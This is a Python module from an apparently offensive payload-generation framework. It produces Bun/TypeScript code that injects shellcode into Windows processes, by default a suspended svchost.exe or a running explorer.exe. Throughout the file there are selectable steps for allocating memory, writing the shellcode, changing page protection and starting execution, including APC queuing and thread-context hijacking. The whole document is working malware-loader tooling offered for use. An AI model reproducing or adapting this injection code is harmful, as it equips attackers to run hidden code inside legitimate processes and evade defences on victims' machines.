from string import Template
import os
from common.utils.argumentparser import ArgumentParser

class spawnandinject:
    def __init__(self, arguments):
        parser = ArgumentParser(modulename=self.__class__.__name__)
        parser.add_argument(name='mode', default='spawn', help='Spawn a new process or inject into another one', choices={'spawn', 'inject'})
        parser.add_argument(name='spawn', default='CreateProcessA', help='Which function to use to spawn a new process', choices={'CreateProcessA'})
        parser.add_argument(name='allocate', default='VirtualAllocEx', help='Function to use for allocating memory', choices={'VirtualAllocEx', 'NtAllocateVirtualMemory'})
        parser.add_argument(name='write', default='WriteProcessMemory', help='Function used for writing memory', choices={'WriteProcessMemory', 'NtWriteVirtualMemory'})
        parser.add_argument(name='execute', default='CreateRemoteThread', help='Function used for executing the shellcode', choices={'CreateRemoteThread', 'QueueUserAPC', 'SetThreadContext', 'NtCreateThreadEx'})
        parser.add_argument(name='protect', default='VirtualProtectEx', help='Function used for changing memory protections', choices={'VirtualProtectEx', 'NtProtectVirtualMemory'})
        parser.add_argument(name='wait', default='WaitForSingleObject', help='Function used for waiting for execution to finish. Only applicable for CreateRemoteThread and NtCreateThreadEx', choices={'WaitForSingleObject', 'NtWaitForSingleObject', 'None'})
        parser.add_argument(name='close', default='CloseHandle', help='Function used for closing handles after use', choices={'CloseHandle', 'NtClose'})
        parser.add_argument(name='target', default='', help='Target process for spawning or injecting', choices={})
        parser.add_argument(name='perm', default='rx', help='Protection of memory when shellcode executes', choices={'rx': 'PAGE_EXECUTE_READ', 'rwx':'PAGE_EXECUTE_READWRITE'})
        self.args = parser.parse_args(arguments)     

        # Target override if not specified
        if self.args['target'] == '':
            if self.args['mode'] == 'inject':
                self.args['target'] = 'explorer.exe'
            elif self.args['mode'] == 'spawn':
                self.args['target'] = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        else:
            self.args['target'] = self.args['target'].replace('\\','\\\\')

        # Override wait option
        if self.args['execute'] in ['NtCreateThreadEx', 'CreateRemoteThread']:
            self.args['wait'] = 'WaitForSingleObject'
        else:
            self.args['wait'] = 'None'

    def imports(self) -> list[str]:
        return ['import { ptr } from "bun:ffi";',
                'import { MemoryAllocationType, MemoryProtection, ProcessCreationFlags, ProcessAccessRights, ThreadAccessRights, ToolhelpSnapshotFlags } from "@bun-win32/kernel32";']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        template = ''
        if self.args['mode'] == 'spawn':
            template += Template("""    
    const si = new Uint8Array(104);
    new DataView(si.buffer).setUint32(0, 104, true);
    const pi = new Uint8Array(24);
    const cmdline = Buffer.from('$target\\0', 'utf8');

    {CreateProcessA}(null, ptr(cmdline), null, null, 0, ProcessCreationFlags.CREATE_SUSPENDED, null, null, ptr(si), ptr(pi));

    const view = new DataView(pi.buffer);
    const hProcess = view.getBigUint64(0, true);
    const hThread = view.getBigUint64(8, true);
""").substitute(target=self.args['target'])
        elif self.args['mode'] == 'inject':
            template += Template("""
    let hProcSnap = {CreateToolhelp32Snapshot}(ToolhelpSnapshotFlags.TH32CS_SNAPPROCESS, 0);
    let pe32 = new Uint8Array(336);
    let pe32_view = new DataView(pe32.buffer);
    pe32_view.setUint32(0, 336, true);
    let pid = 0;

    {Process32First}(hProcSnap, ptr(pe32));

    while ({Process32Next}(hProcSnap, ptr(pe32))) {{
        let processname = new Uint8Array(pe32_view.buffer, 44, 260);
        let nullIndex = processname.indexOf(0);
        let text = new TextDecoder('utf-8').decode(processname.subarray(0, nullIndex));
        if (text == '$target'){{
            pid = pe32_view.getUint32(8, true);
            break;
        }}
    }}
    let hProcess = {OpenProcess}( ProcessAccessRights.PROCESS_CREATE_THREAD | ProcessAccessRights.PROCESS_QUERY_INFORMATION | ProcessAccessRights.PROCESS_VM_OPERATION | ProcessAccessRights.PROCESS_VM_READ | ProcessAccessRights.PROCESS_VM_WRITE, false, pid);

    let hThreadSnap = {CreateToolhelp32Snapshot}(ToolhelpSnapshotFlags.TH32CS_SNAPTHREAD, 0);
    let th32 = new Uint8Array(28);
    let th32_view = new DataView(th32.buffer);
    th32_view.setUint32(0, 28, true);
    let hThread = 0;

    {Thread32First}(hThreadSnap, ptr(th32_view));

    while ({Thread32Next}(hThreadSnap, ptr(th32_view)))
    {{
        let parentpid = th32_view.getUint32(12, true);
        let threadid = th32_view.getUint32(8, true);
        if (parentpid == pid)
        {{
            hThread = {OpenThread}(ThreadAccessRights.THREAD_ALL_ACCESS, false, threadid);
            break;
        }}
    }}

""").substitute(target=self.args['target'])

        if self.args['allocate'] == 'VirtualAllocEx':
            template += """
    const address = {VirtualAllocEx}(hProcess, 0, {shellcodeSize}n, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
"""
        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
            template += """
    let regionSize = new BigUint64Array(1);
    let baseAddress = new BigUint64Array(1);
    regionSize[0] = {shellcodeSize}n;
    let status = {NtAllocateVirtualMemory}(hProcess, ptr(baseAddress), 0n, ptr(regionSize), MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
    let address = baseAddress[0];
"""

        template += """
    {transformers}
"""

        if self.args['write'] == 'WriteProcessMemory':
            template += """
    let bytesWritten = new BigUint64Array(1);
    {WriteProcessMemory}(hProcess, address, ptr(shellcode), {shellcodeSize}n, bytesWritten);
"""
        elif self.args['write'] == "NtWriteVirtualMemory":
            template += """
    let bytesWritten = new BigUint64Array(1);
    {NtWriteVirtualMemory}(hProcess, BigInt(address), ptr(shellcode), {shellcodeSize}n, ptr(bytesWritten));
"""

        if self.args['protect'] == 'VirtualProtectEx':
            template += Template("""
    let oldProtect = new Uint32Array(1);
    {VirtualProtectEx}(hProcess, address, {shellcodeSize}n, MemoryProtection.$perm, oldProtect)
""").substitute(perm=self.args['perm'])
        elif self.args['protect'] == 'NtProtectVirtualMemory':
            template += Template("""
    let oldProtect = new Uint32Array(1);;
    let regionSize_$n = new BigUint64Array(1);
    regionSize_$n[0] = {shellcodeSize}n;
    let baseAddress_$n = new BigUint64Array([BigInt(address)]);
    {NtProtectVirtualMemory}(hProcess, ptr(baseAddress_$n), ptr(regionSize_$n), MemoryProtection.$perm, ptr(oldProtect));
""").substitute(n=os.urandom(4).hex(), perm=self.args['perm'])

        if self.args['execute'] == 'CreateRemoteThread':
            template += """
    const newThread = {CreateRemoteThread}(hProcess, null, 0, address, 0, 0, null);
"""
        elif self.args['execute'] == 'QueueUserAPC':
            template += """
    {QueueUserAPC}(address, hThread, 0);
    {ResumeThread}(hThread);
"""
        elif self.args['execute'] == 'NtCreateThreadEx':
            template += """
    let hThreadBuffer = new BigUint64Array(1); 
    {NtCreateThreadEx}(ptr(hThreadBuffer), ThreadAccessRights.THREAD_ALL_ACCESS, null, hProcess, address, 0n, 0, 0n, 0n, 0n, null);
    let newThread = hThreadBuffer[0];
"""
        elif self.args['execute'] == 'SetThreadContext':
            template += Template("""
    let context = new Uint8Array(0x4d0); 
    const view_$n = new DataView(context.buffer);
    view_$n.setUint32(0x30, 0x00100001, true);
    {GetThreadContext}(hThread, ptr(context)); 
    view_$n.setBigUint64(0xf8, address, true);
    {SetThreadContext}(hThread, ptr(context));
""").substitute(n=os.urandom(4).hex())
        elif self.args['execute'] == 'NtQueueApcThread':
            template += """
    {NtQueueApcThread}(hThread, address, null, null, 0);
"""

        if self.args['wait'] == 'WaitForSingleObject':
            template += """
    {WaitForSingleObject}(newThread, 500);
    {CloseHandle}(newThread);
"""
        elif self.args['wait'] == 'None':
            template += """
    {ResumeThread}(hThread);
"""
        elif self.args['wait'] == 'NtWaitForSingleObject':
            template += """
    {NtWaitForSingleObject}(newThread, 0);
"""

        if self.args['allocate'] == 'VirtualAllocEx':
            template += """
    {VirtualFree}(address, 0, MemoryAllocationType.MEM_RELEASE) ;
"""
        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
            template += """
    {NtFreeVirtualMemory}(-1n, address);
"""

        return template